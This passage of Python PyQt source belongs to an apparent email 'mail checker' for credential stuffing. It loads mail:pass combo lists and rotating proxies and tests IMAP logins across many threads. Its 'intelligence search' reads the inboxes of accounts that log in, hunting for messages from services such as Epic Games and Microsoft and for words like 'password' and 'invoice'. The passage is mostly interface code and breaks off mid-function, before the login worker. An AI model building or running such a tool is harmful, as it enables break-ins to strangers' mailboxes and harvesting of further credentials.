                    stop:0 #737373, stop:1 #a3a3a3);
            }
        """)
        self.buttons.button(QDialogButtonBox.StandardButton.Cancel).setStyleSheet("""
            QPushButton {
                background: rgba(64, 64, 64, 0.3);
                color: #d4d4d4;
                border: 2px solid #404040;
                border-radius: 8px;
                padding: 12px 30px;
                font-weight: bold;
                font-size: 10pt;
            }
            QPushButton:hover {
                background: rgba(64, 64, 64, 0.5);
                border: 2px solid #525252;
            }
        """)
        self.buttons.accepted.connect(self.accept)
        self.buttons.rejected.connect(self.reject)
        self.layout.addWidget(self.buttons)
        
        self.load_settings()

    def init_general_tab(self, tab):
        layout = QFormLayout(tab)
        layout.setSpacing(15)
        
        self.threads_spinbox = QSpinBox()
        self.threads_spinbox.setRange(10, 5000)
        self.threads_spinbox.setSingleStep(50)
        
        self.timeout_spinbox = QSpinBox()
        self.timeout_spinbox.setRange(1, 120)
        self.timeout_spinbox.setSuffix(" seconds")
        
        self.delimiter_edit = QLineEdit()
        
        note_label = QLabel("Results saved to timestamped folders | errors.txt = mail:pass only")
        note_label.setStyleSheet("color: #4ade80; font-size: 9pt; padding: 5px;")
        note_label.setWordWrap(True)
        
        retry_note = QLabel("Intelligent Adaptive: Quick first try (5-8s), then full timeout (default 12s)")
        retry_note.setStyleSheet("color: #9b59b6; font-size: 9pt; padding: 5px;")
        retry_note.setWordWrap(True)

        layout.addRow("Threads:", self.threads_spinbox)
        layout.addRow("IMAP Timeout:", self.timeout_spinbox)
        layout.addRow("Combo Delimiter:", self.delimiter_edit)
        layout.addRow("", note_label)
        layout.addRow("", retry_note)

    def init_proxy_tab(self, tab):
        layout = QVBoxLayout(tab)
        layout.setSpacing(15)
        
        self.use_proxies_checkbox = QCheckBox("Enable Proxies")
        layout.addWidget(self.use_proxies_checkbox)
        
        proxy_type_group = QGroupBox("Proxy Configuration")
        proxy_form = QFormLayout(proxy_type_group)
        proxy_form.setSpacing(12)
        
        self.proxy_type_combo = QComboBox()
        self.proxy_type_combo.addItems(["HTTP/HTTPS", "SOCKS4", "SOCKS5"])
        proxy_form.addRow("Proxy Type:", self.proxy_type_combo)
        
        self.proxy_username_edit = QLineEdit()
        self.proxy_username_edit.setPlaceholderText("Optional")
        proxy_form.addRow("Username:", self.proxy_username_edit)
        
        self.proxy_password_edit = QLineEdit()
        self.proxy_password_edit.setEchoMode(QLineEdit.EchoMode.Password)
        self.proxy_password_edit.setPlaceholderText("Optional")
        proxy_form.addRow("Password:", self.proxy_password_edit)
        
        layout.addWidget(proxy_type_group)
        
        auto_reload_group = QGroupBox("Auto-Reload Proxies")
        auto_reload_form = QFormLayout(auto_reload_group)
        auto_reload_form.setSpacing(12)
        
        self.auto_reload_checkbox = QCheckBox("Enable Auto-Reload")
        auto_reload_form.addRow("", self.auto_reload_checkbox)
        
        self.proxy_url_edit = QLineEdit()
        self.proxy_url_edit.setPlaceholderText("https://api.proxyscrape.com/v2/?request=get&protocol=http")
        auto_reload_form.addRow("Proxy URL:", self.proxy_url_edit)
        
        info_label = QLabel("URL should return proxies (one per line: IP:PORT)")
        info_label.setStyleSheet("color: #00bcd4; font-size: 9pt;")
        info_label.setWordWrap(True)
        auto_reload_form.addRow("", info_label)
        
        layout.addWidget(auto_reload_group)
        
        if not SOCKS_AVAILABLE:
            warning_label = QLabel("PySocks not installed - SOCKS disabled")
            warning_label.setStyleSheet("color: #ffc107; font-weight: bold; padding: 10px;")
            layout.addWidget(warning_label)
            self.proxy_type_combo.model().item(1).setEnabled(False)
            self.proxy_type_combo.model().item(2).setEnabled(False)
        
        layout.addStretch()
        
        self.use_proxies_checkbox.toggled.connect(proxy_type_group.setEnabled)
        self.use_proxies_checkbox.toggled.connect(auto_reload_group.setEnabled)
        proxy_type_group.setEnabled(False)
        auto_reload_group.setEnabled(False)

    def init_intelligence_tab(self, tab):
        layout = QVBoxLayout(tab)
        layout.setSpacing(15)
        
        self.intelligence_search_checkbox = QCheckBox("Enable Intelligence Search on Hits")
        layout.addWidget(self.intelligence_search_checkbox)

        self.search_options_group = QGroupBox("Search Criteria")
        form_layout = QFormLayout(self.search_options_group)
        form_layout.setSpacing(12)

        self.senders_edit = QTextEdit()
        self.senders_edit.setPlaceholderText("One sender per line")
        self.senders_edit.setMinimumHeight(80)
        
        self.keywords_edit = QTextEdit()
        self.keywords_edit.setPlaceholderText("One keyword per line")
        self.keywords_edit.setMinimumHeight(80)

        search_locations_layout = QHBoxLayout()
        self.search_in_subject_cb = QCheckBox("Subject")
        self.search_in_body_cb = QCheckBox("Body")
        search_locations_layout.addWidget(self.search_in_subject_cb)
        search_locations_layout.addWidget(self.search_in_body_cb)

        self.mailboxes_edit = QLineEdit()
        self.fetch_count_spinbox = QSpinBox()
        self.fetch_count_spinbox.setRange(1, 100)
        self.fetch_count_spinbox.setSuffix(" emails")

        form_layout.addRow("Senders:", self.senders_edit)
        form_layout.addRow("Keywords:", self.keywords_edit)
        form_layout.addRow("Search In:", search_locations_layout)
        form_layout.addRow("Mailboxes:", self.mailboxes_edit)
        form_layout.addRow("Fetch Count:", self.fetch_count_spinbox)
        
        layout.addWidget(self.search_options_group)
        layout.addStretch()
        
        self.intelligence_search_checkbox.toggled.connect(self.search_options_group.setEnabled)

    def load_settings(self):
        s = self.settings_manager
        self.threads_spinbox.setValue(s.value("threads", 200, type=int))
        self.timeout_spinbox.setValue(s.value("timeout", 12, type=int))
        self.delimiter_edit.setText(s.value("delimiter", ":"))
        
        self.use_proxies_checkbox.setChecked(s.value("use_proxies", False, type=bool))
        
        proxy_type = s.value("proxy_type", "HTTP/HTTPS")
        index = self.proxy_type_combo.findText(proxy_type)
        if index >= 0:
            self.proxy_type_combo.setCurrentIndex(index)
        
        self.proxy_username_edit.setText(s.value("proxy_username", ""))
        self.proxy_password_edit.setText(s.value("proxy_password", ""))
        
        self.auto_reload_checkbox.setChecked(s.value("auto_reload_proxies", False, type=bool))
        self.proxy_url_edit.setText(s.value("proxy_reload_url", ""))
        
        is_intel_enabled = s.value("intelligence_search_enabled", False, type=bool)
        self.intelligence_search_checkbox.setChecked(is_intel_enabled)
        self.search_options_group.setEnabled(is_intel_enabled)

        self.senders_edit.setText(s.value("intelligence_senders", "epicgames.com\naccount@microsoft.com"))
        self.keywords_edit.setText(s.value("intelligence_keywords", "password\ninvoice"))
        self.search_in_subject_cb.setChecked(s.value("search_in_subject", True, type=bool))
        self.search_in_body_cb.setChecked(s.value("search_in_body", True, type=bool))
        self.mailboxes_edit.setText(s.value("intelligence_mailboxes", "INBOX,Spam"))
        self.fetch_count_spinbox.setValue(s.value("intelligence_emails_to_fetch", 5, type=int))

    def accept(self):
        s = self.settings_manager
        s.setValue("threads", self.threads_spinbox.value())
        s.setValue("timeout", self.timeout_spinbox.value())
        s.setValue("delimiter", self.delimiter_edit.text())
        
        s.setValue("use_proxies", self.use_proxies_checkbox.isChecked())
        s.setValue("proxy_type", self.proxy_type_combo.currentText())
        s.setValue("proxy_username", self.proxy_username_edit.text())
        s.setValue("proxy_password", self.proxy_password_edit.text())
        
        s.setValue("auto_reload_proxies", self.auto_reload_checkbox.isChecked())
        s.setValue("proxy_reload_url", self.proxy_url_edit.text())
        
        s.setValue("intelligence_search_enabled", self.intelligence_search_checkbox.isChecked())
        s.setValue("intelligence_senders", self.senders_edit.toPlainText())
        s.setValue("intelligence_keywords", self.keywords_edit.toPlainText())
        s.setValue("search_in_subject", self.search_in_subject_cb.isChecked())
        s.setValue("search_in_body", self.search_in_body_cb.isChecked())
        s.setValue("intelligence_mailboxes", self.mailboxes_edit.text())
        s.setValue("intelligence_emails_to_fetch", self.fetch_count_spinbox.value())
        super().accept()


class IntelligenceReportDialog(QDialog):
    def __init__(self, email_details, match_type, match_detail, parent=None):
        super().__init__(parent)
        self.email_details = email_details
        self.setWindowTitle(f"Intelligence Report: {match_type} - {match_detail}")
        self.setMinimumSize(1000, 750)
        self.setStyleSheet("""
            QDialog {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #0f0f0f, stop:1 #1a1a1a);
            }
            QLabel {
                color: #d4d4d4;
            }
            QListWidget, QTextEdit {
                background: rgba(26, 26, 26, 0.3);
                color: #d4d4d4;
                border: 2px solid #404040;
                border-radius: 8px;
                font-family: 'Courier New';
            }
            QListWidget::item:selected {
                background: #525252;
            }
            QTabWidget::pane {
                border: 2px solid #404040;
                border-radius: 8px;
            }
            QTabBar::tab {
                background: rgba(64, 64, 64, 0.3);
                color: #737373;
                padding: 10px 20px;
            }
            QTabBar::tab:selected {
                background: #525252;
                color: #d4d4d4;
            }
        """)

        main_layout = QVBoxLayout(self)
        
        title = QLabel(f"{match_type}: {match_detail}")
        title.setFont(QFont("Segoe UI", 14, QFont.Weight.Bold))
        title.setStyleSheet("color: #4ade80; padding: 10px;")
        main_layout.addWidget(title)
        
        splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(splitter)

        self.email_list_widget = QListWidget()
        self.email_list_widget.setMaximumWidth(350)
        splitter.addWidget(self.email_list_widget)

        details_widget = QWidget()
        details_layout = QVBoxLayout(details_widget)
        self.details_tabs = QTabWidget()
        details_layout.addWidget(self.details_tabs)
        
        self.body_view = QTextEdit()
        self.body_view.setReadOnly(True)
        
        self.headers_view = QTextEdit()
        self.headers_view.setReadOnly(True)
        self.headers_view.setFont(QFont("Courier New", 10))

        self.details_tabs.addTab(self.body_view, "Email Body")
        self.details_tabs.addTab(self.headers_view, "Full Headers")

        splitter.addWidget(details_widget)
        splitter.setSizes([250, 650])

        self.email_list_widget.currentItemChanged.connect(self.display_email_content)
        self.populate_email_list()

    def populate_email_list(self):
        for i, detail in enumerate(self.email_details):
            subject = detail.get('subject', 'No Subject')
            date = detail.get('date', 'No Date')
            item_text = f"{subject[:35]}...\n{date}"
            item = QListWidgetItem(item_text, self.email_list_widget)
            item.setData(Qt.ItemDataRole.UserRole, i)         

        if self.email_details:
            self.email_list_widget.setCurrentRow(0)

    def display_email_content(self, current, previous):
        if current is None:
            return
        
        index = current.data(Qt.ItemDataRole.UserRole)
        email_data = self.email_details[index]

        body = f"From: {email_data.get('from', '')}\n" \
               f"Subject: {email_data.get('subject', '')}\n" \
               f"Date: {email_data.get('date', '')}\n" \
               f"{'='*80}\n\n{email_data.get('body', '')}"
        
        self.body_view.setText(body)
        self.headers_view.setText(email_data.get('headers', ''))


class DomainViewerDialog(QDialog):
    def __init__(self, domain_mappings, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Domain IMAP Mappings")
        self.setMinimumSize(800, 550)
        self.setStyleSheet("""
            QDialog {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #0f0f0f, stop:1 #1a1a1a);
            }
            QLabel {
                color: #d4d4d4;
            }
            QTableWidget {
                background: rgba(26, 26, 26, 0.3);
                color: #d4d4d4;
                gridline-color: rgba(115, 115, 115, 0.1);
                border: 2px solid #404040;
                border-radius: 8px;
            }
            QHeaderView::section {
                background: #525252;
                color: #d4d4d4;
                padding: 12px;
                border: none;
                font-weight: bold;
            }
        """)

        self.layout = QVBoxLayout(self)
        
        title = QLabel("Domain IMAP Server Mappings")
        title.setFont(QFont("Segoe UI", 14, QFont.Weight.Bold))
        title.setStyleSheet("color: #4ade80; padding: 10px;")
        self.layout.addWidget(title)
        
        info_label = QLabel(f"Total Domains: {len(domain_mappings)}")
        info_label.setStyleSheet("color: #a3a3a3; padding: 5px;")
        self.layout.addWidget(info_label)
        
        self.table = QTableWidget()
        self.layout.addWidget(self.table)
        
        self.table.setColumnCount(4)
        self.table.setHorizontalHeaderLabels(["Domain", "IMAP Server", "Port", "Source"])
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self.table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self.table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.table.setAlternatingRowColors(True)

        self.populate_table(domain_mappings)

    def populate_table(self, domain_mappings):
        self.table.setRowCount(len(domain_mappings))
        for row, (domain, data) in enumerate(sorted(domain_mappings.items())):
            self.table.setItem(row, 0, QTableWidgetItem(domain))
            self.table.setItem(row, 1, QTableWidgetItem(data['server']))
            self.table.setItem(row, 2, QTableWidgetItem(str(data['port'])))
            
            source_item = QTableWidgetItem(data['source'])
            color = QColor("cyan") if data['source'] == "Custom" else QColor("#4ade80")
            source_item.setForeground(color)
            self.table.setItem(row, 3, source_item)
            
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("MAIL CHECKER IMAP")
        self.setMinimumSize(1280, 720)
        
        self.settings = QSettings("MailChecker", "IMAP")
        
        self.worker = None
        self.worker_thread = None

        self.is_running = False
        self.is_paused = False
        self.combos_loaded = 0
        self.combos_file_path = None
        self.proxies_loaded = 0
        self.blacklist_loaded = 0
        self.blacklist = set()
        
        self.current_session_folder = None

        self.ini_domains = {}
        self.custom_domains = {}
        self.final_domains = {}
        
        self.domain_servers = defaultdict(list)
        
        create_default_domains_ini()
        create_default_blacklist()
        self._load_ini_domains()
        self._auto_load_custom_domains()
        self._auto_load_blacklist()
        self._update_final_domains()

        self.init_ui()
        self.create_menu_bar()
        self.init_actions()
        self.apply_theme()

        self.progress_timer = QTimer()
        self.progress_timer.timeout.connect(self.timer_update_progress)
        self.progress_timer.start(500)
        self.last_gui_stats = (0, 0, 0, 0, 0)
        self.cpm = 0
        
        self.max_table_rows = 1000
        
        self._hit_batch = []
        self._invalid_batch = []
        self._error_batch = []

    def create_menu_bar(self):
        menubar = self.menuBar()
        
        file_menu = menubar.addMenu("&File")
        
        load_combos_action = file_menu.addAction("Load Combos")
        load_combos_action.triggered.connect(self.load_combos)
        
        load_proxies_action = file_menu.addAction("Load Proxies")
        load_proxies_action.triggered.connect(self.load_proxies)
        
        reload_blacklist_action = file_menu.addAction("Reload Blacklist")
        reload_blacklist_action.triggered.connect(self.reload_blacklist)
        
        file_menu.addSeparator()
        
        open_results_action = file_menu.addAction("Open Results Folder")
        open_results_action.triggered.connect(self.open_results_folder)
        
        file_menu.addSeparator()
        
        exit_action = file_menu.addAction("Exit")
        exit_action.triggered.connect(self.close)
        
        domain_menu = menubar.addMenu("&Domains")
        domain_menu.addAction("Load Custom Domains...", self.load_custom_domains)
        domain_menu.addAction("View Domain Mappings...", self.view_domain_mappings)
        domain_menu.addSeparator()
        domain_menu.addAction("View Blacklist...", self.view_blacklist)
        domain_menu.addAction("Edit Blacklist...", self.edit_blacklist)
        
        tools_menu = menubar.addMenu("&Tools")
        
        settings_action = tools_menu.addAction("Settings")
        settings_action.triggered.connect(self.open_settings)
        
        tools_menu.addSeparator()
        
        export_menu = tools_menu.addMenu("Export Results")
        export_menu.addAction("Export Hits...", lambda: self.export_table(self.results_table_hits))
        export_menu.addAction("Export Invalids...", lambda: self.export_table(self.results_table_invalids))
        export_menu.addAction("Export Errors...", lambda: self.export_table(self.results_table_errors))
        export_menu.addAction("Export Intelligence...", lambda: self.export_table(self.results_table_intelligence_hits))
        
        tools_menu.addSeparator()
        
        clear_results_action = tools_menu.addAction("Clear Results")
        clear_results_action.triggered.connect(self.clear_results)

    def clear_results(self):
        reply = QMessageBox.question(self, "Clear Results", 
                                     "Are you sure you want to clear all results?",
                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                                     QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            self.results_table_hits.setRowCount(0)
            self.results_table_invalids.setRowCount(0)
            self.results_table_errors.setRowCount(0)
            self.results_table_intelligence_hits.setRowCount(0)
            self.log_box.clear()
            self.progress_bar.setValue(0)
            
            self.stat_widgets['checked'].value_label.setText("0")
            self.stat_widgets['hits'].value_label.setText("0")
            self.stat_widgets['invalids'].value_label.setText("0")
            self.stat_widgets['errors'].value_label.setText("0")
            self.stat_widgets['intelligence'].value_label.setText("0")
            self.stat_widgets['cpm'].value_label.setText("0")
            self.stat_widgets['blacklisted'].value_label.setText("0")
            
            self.tabs.setTabText(0, "HITS (0)")
            self.tabs.setTabText(1, "INVALIDS (0)")
            self.tabs.setTabText(2, "ERRORS (0)")
            self.tabs.setTabText(3, "INTELLIGENCE (0)")
            
            self._hit_batch = []
            self._invalid_batch = []
            self._error_batch = []
            
            gc.collect()
            
            self.update_status("Results cleared", "#a3a3a3")
            
    def init_ui(self):
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setSpacing(15)
        self.main_layout.setContentsMargins(20, 20, 20, 20)

        header = QHBoxLayout()
        
        title_section = QVBoxLayout()
        title = QLabel("MAIL CHECKER")
        title.setFont(QFont("Segoe UI", 26, QFont.Weight.Bold))
        title.setStyleSheet("color: #d4d4d4; letter-spacing: 3px;")
        
        subtitle = QLabel("MOATTYA")
        subtitle.setFont(QFont("Segoe UI", 10))
        subtitle.setStyleSheet("color: #737373;")
        
        title_section.addWidget(title)
        title_section.addWidget(subtitle)
        
        header.addLayout(title_section)
        header.addStretch()
        
        self.btn_start = self.create_button("START", "#525252", "#737373")
        self.btn_pause = self.create_button("PAUSE", "#404040", "#525252")
        self.btn_stop = self.create_button("STOP", "#262626", "#404040")
        
        self.btn_pause.setEnabled(False)
        self.btn_stop.setEnabled(False)
        
        header.addWidget(self.btn_start)
        header.addWidget(self.btn_pause)
        header.addWidget(self.btn_stop)
        
        self.main_layout.addLayout(header)
        
        stats_frame = QFrame()
        stats_frame.setStyleSheet("""
            QFrame {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 rgba(64, 64, 64, 0.2), 
                    stop:0.5 rgba(82, 82, 82, 0.1),
                    stop:1 rgba(64, 64, 64, 0.2));
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 15px;
                padding: 20px;
            }
        """)
        stats_layout = QHBoxLayout(stats_frame)
        stats_layout.setSpacing(20)
        
        self.stat_widgets = {}
        stats_data = [
            ("CHECKED", "0", "#525252"),
            ("HITS", "0", "#4ade80"),
            ("INVALIDS", "0", "#a3a3a3"),
            ("ERRORS", "0", "#d4d4d4"),
            ("INTELLIGENCE", "0", "#9b59b6"),
            ("CPM", "0", "#e5e5e5"),
            ("BLACKLISTED", "0", "#ff6b6b"),
        ]
        
        for label_text, value, color in stats_data:
            stat_widget = self.create_stat_card(label_text, value, color)
            self.stat_widgets[label_text.lower()] = stat_widget
            stats_layout.addWidget(stat_widget)
        
        self.main_layout.addWidget(stats_frame)
        
        file_controls = QHBoxLayout()
        file_controls.setSpacing(15)
        
        self.combos_info = QLabel("Combos: 0")
        self.combos_info.setFont(QFont("Segoe UI", 11, QFont.Weight.Bold))
        self.combos_info.setStyleSheet("color: #a3a3a3; padding: 8px;")
        
        self.proxies_info = QLabel("Proxies: 0")
        self.proxies_info.setFont(QFont("Segoe UI", 11, QFont.Weight.Bold))
        self.proxies_info.setStyleSheet("color: #a3a3a3; padding: 8px;")
        
        self.blacklist_info = QLabel(f"Blacklist: {self.blacklist_loaded}")
        self.blacklist_info.setFont(QFont("Segoe UI", 11, QFont.Weight.Bold))
        self.blacklist_info.setStyleSheet("color: #ff6b6b; padding: 8px;")
        
        file_controls.addWidget(self.combos_info)
        file_controls.addWidget(self.proxies_info)
        file_controls.addWidget(self.blacklist_info)
        file_controls.addStretch()
        
        btn_load_combos = self.create_small_button("Load Combos")
        btn_load_proxies = self.create_small_button("Load Proxies")
        btn_load_proxies_url = self.create_small_button("Load from URL")
        btn_reload_blacklist = self.create_small_button("Reload Blacklist")
        
        self.btn_open_results = self.create_small_button("Results")
        self.btn_open_results.clicked.connect(self.open_results_folder)
        
        btn_settings = self.create_small_button("Settings")
        
        btn_load_combos.clicked.connect(self.load_combos)
        btn_load_proxies.clicked.connect(self.load_proxies)
        btn_load_proxies_url.clicked.connect(self.load_proxies_from_url)
        btn_reload_blacklist.clicked.connect(self.reload_blacklist)
        btn_settings.clicked.connect(self.open_settings)
        
        file_controls.addWidget(btn_load_combos)
        file_controls.addWidget(btn_load_proxies)
        file_controls.addWidget(btn_load_proxies_url)
        file_controls.addWidget(btn_reload_blacklist)
        file_controls.addWidget(self.btn_open_results)
        file_controls.addWidget(btn_settings)
        
        self.main_layout.addLayout(file_controls)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setFixedHeight(20)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                background: rgba(64, 64, 64, 0.3);
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 10px;
                text-align: center;
                color: #d4d4d4;
                font-weight: bold;
                font-size: 10pt;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #404040, stop:0.5 #525252, stop:1 #737373);
                border-radius: 8px;
            }
        """)
        self.main_layout.addWidget(self.progress_bar)
        
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 10px;
                background: rgba(26, 26, 26, 0.5);
            }
            QTabBar::tab {
                background: rgba(64, 64, 64, 0.3);
                color: #737373;
                padding: 12px 25px;
                margin-right: 5px;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
                font-weight: 600;
                font-size: 10pt;
            }
            QTabBar::tab:selected {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #525252, stop:1 #404040);
                color: #d4d4d4;
            }
            QTabBar::tab:hover {
                background: rgba(82, 82, 82, 0.4);
                color: #a3a3a3;
            }
        """)

        self.results_table_hits = self.create_results_table(["Combo", "Details"])
        self.results_table_invalids = self.create_results_table(["Combo", "Reason"])
        self.results_table_errors = self.create_results_table(["Combo", "Error"])
        self.results_table_intelligence_hits = self.create_results_table(["Email", "Type", "Match", "Mailbox", "Count"])
        
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.document().setMaximumBlockCount(200)
        self.log_box.setStyleSheet("""
            QTextEdit {
                background: rgba(26, 26, 26, 0.3);
                color: #d4d4d4;
                border: none;
                border-radius: 8px;
                padding: 15px;
                font-family: 'Consolas', 'Courier New', monospace;
                font-size: 10pt;
            }
        """)

        self.tabs.addTab(self.results_table_hits, "HITS (0)")
        self.tabs.addTab(self.results_table_invalids, "INVALIDS (0)")
        self.tabs.addTab(self.results_table_errors, "ERRORS (0)")
        self.tabs.addTab(self.results_table_intelligence_hits, "INTELLIGENCE (0)")
        self.tabs.addTab(self.log_box, "LOG")
        
        self.main_layout.addWidget(self.tabs)
        
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_label = QLabel("Ready")
        self.status_label.setFont(QFont("Segoe UI", 10, QFont.Weight.Bold))
        self.status_label.setStyleSheet("color: #a3a3a3;")
        self.status_bar.addWidget(self.status_label, 1)

    def create_button(self, text, color1, color2):
        btn = QPushButton(text)
        btn.setFixedSize(120, 45)
        btn.setFont(QFont("Segoe UI", 10, QFont.Weight.Bold))
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet(f"""
            QPushButton {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {color1}, stop:1 {color2});
                color: white;
                border: none;
                border-radius: 8px;
                letter-spacing: 1px;
            }}
            QPushButton:hover {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {color2}, stop:1 #a3a3a3);
            }}
            QPushButton:pressed {{
                background: {color1};
            }}
            QPushButton:disabled {{
                background: rgba(64, 64, 64, 0.3);
                color: rgba(115, 115, 115, 0.5);
            }}
        """)
        return btn

    def create_small_button(self, text):
        btn = QPushButton(text)
        btn.setFixedHeight(32)
        btn.setFont(QFont("Segoe UI", 9, QFont.Weight.Bold))
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 rgba(82, 82, 82, 0.4), stop:1 rgba(115, 115, 115, 0.4));
                color: #d4d4d4;
                border: 2px solid rgba(115, 115, 115, 0.4);
                border-radius: 6px;
                padding: 0 18px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 rgba(82, 82, 82, 0.6), stop:1 rgba(115, 115, 115, 0.6));
                border: 2px solid rgba(163, 163, 163, 0.6);
            }
        """)
        return btn

    def create_stat_card(self, label_text, value, color):
        widget = QFrame()
        widget.setStyleSheet(f"""
            QFrame {{
                background: rgba(64, 64, 64, 0.2);
                border-left: 4px solid {color};
                border-radius: 10px;
                padding: 12px;
            }}
        """)
        
        layout = QVBoxLayout(widget)
        layout.setSpacing(5)
        
        label = QLabel(label_text)
        label.setFont(QFont("Segoe UI", 9, QFont.Weight.Bold))
        label.setStyleSheet(f"color: {color}; border: none; letter-spacing: 1px;")
        
        value_label = QLabel(value)
        value_label.setFont(QFont("Segoe UI", 20, QFont.Weight.Bold))
        value_label.setStyleSheet(f"color: {color}; border: none;")
        value_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        value_label.setWordWrap(False)
        
        layout.addWidget(label)
        layout.addWidget(value_label)
        
        widget.value_label = value_label
        
        return widget

    def create_results_table(self, headers):
        table = QTableWidget()
        table.setColumnCount(len(headers))
        table.setHorizontalHeaderLabels(headers)
        table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        if len(headers) > 1:
            table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        table.verticalHeader().setVisible(False)
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        table.customContextMenuRequested.connect(lambda pos, t=table: self.show_table_context_menu(t, pos))
        table.setAlternatingRowColors(True)
        table.setStyleSheet("""
            QTableWidget {
                background: rgba(26, 26, 26, 0.3);
                color: #d4d4d4;
                gridline-color: rgba(115, 115, 115, 0.1);
                border: none;
                font-size: 10pt;
            }
            QTableWidget::item {
                padding: 12px;
                border-bottom: 1px solid rgba(115, 115, 115, 0.1);
            }
            QTableWidget::item:selected {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 rgba(82, 82, 82, 0.5), stop:1 rgba(115, 115, 115, 0.5));
                color: white;
            }
            QTableWidget::item:alternate {
                background: rgba(64, 64, 64, 0.1);
            }
            QHeaderView::section {
                background: rgba(82, 82, 82, 0.3);
                color: #a3a3a3;
                padding: 12px;
                border: none;
                font-weight: bold;
                font-size: 10pt;
            }
        """)
        
        if "Email" in headers:
            table.cellDoubleClicked.connect(self.show_intelligence_report)
        
        return table

    def init_actions(self):
        self.btn_start.clicked.connect(self.start_checking)
        self.btn_pause.clicked.connect(self.pause_checking)
        self.btn_stop.clicked.connect(self.stop_checking)

    def apply_theme(self):
        self.setStyleSheet("""
            QMainWindow {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #0f0f0f, stop:0.5 #1a1a1a, stop:1 #0f0f0f);
            }
            QWidget {
                color: #d4d4d4;
                font-family: 'Segoe UI', Arial, sans-serif;
            }
            QMenuBar {
                background: rgba(26, 26, 26, 0.8);
                color: #d4d4d4;
                border-bottom: 2px solid rgba(115, 115, 115, 0.3);
                padding: 8px;
            }
            QMenuBar::item {
                background: transparent;
                padding: 8px 15px;
                border-radius: 6px;
            }
            QMenuBar::item:selected {
                background: rgba(115, 115, 115, 0.3);
            }
            QMenu {
                background: rgba(26, 26, 26, 0.95);
                color: #d4d4d4;
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 8px;
            }
            QMenu::item {
                padding: 10px 25px;
                border-radius: 5px;
            }
            QMenu::item:selected {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #525252, stop:1 #737373);
            }
            QStatusBar {
                background: rgba(26, 26, 26, 0.8);
                color: #737373;
                border-top: 2px solid rgba(115, 115, 115, 0.3);
            }
        """)

    def _load_ini_domains(self):
        config = configparser.ConfigParser()
        if os.path.exists('domains.ini'):
            config.read('domains.ini', encoding='utf-8')
            for section in config.sections():
                if section != 'DEFAULT':
                    self.ini_domains[section] = {
                        'server': config.get(section, 'server', fallback=f"imap.{section}"),
                        'port': config.getint(section, 'port', fallback=993),
                        'source': 'Default'
                    }

    def _auto_load_custom_domains(self):
        domains_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'domains.txt')
        if os.path.exists(domains_file):
            try:
                count = 0
                
                with open(domains_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and '|' in line and not line.startswith('#'):
                            parts = line.split('|', 1)
                            if len(parts) == 2:
                                domain = parts[0].strip()
                                server = parts[1].strip()
                                self.domain_servers[domain].append(server)
                                count += 1
                
                for domain, servers in self.domain_servers.items():
                    self.custom_domains[domain] = {
                        'server': servers[-1],
                        'port': 993,
                        'source': 'Custom'
                    }
                    
                    if len(servers) > 1:
                        logging.info(f"Domain {domain} has {len(servers)} servers: {', '.join(servers)}")
                
                if count > 0:
                    logging.info(f"Auto-loaded {count} custom domain mappings from domains.txt")
            except Exception as e:
                logging.error(f"Failed to auto-load domains.txt: {e}")

    def _auto_load_blacklist(self):
        blacklist_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'blacklist.txt')
        self.blacklist = load_blacklist_from_file(blacklist_file)
        self.blacklist_loaded = len(self.blacklist)
        if self.blacklist_loaded > 0:
            logging.info(f"Auto-loaded {self.blacklist_loaded} blacklisted domains")

    def _update_final_domains(self):
        self.final_domains = self.ini_domains.copy()
        self.final_domains.update(self.custom_domains)

    def update_domains_file(self, working_servers):
        if not working_servers:
            return
        
        try:
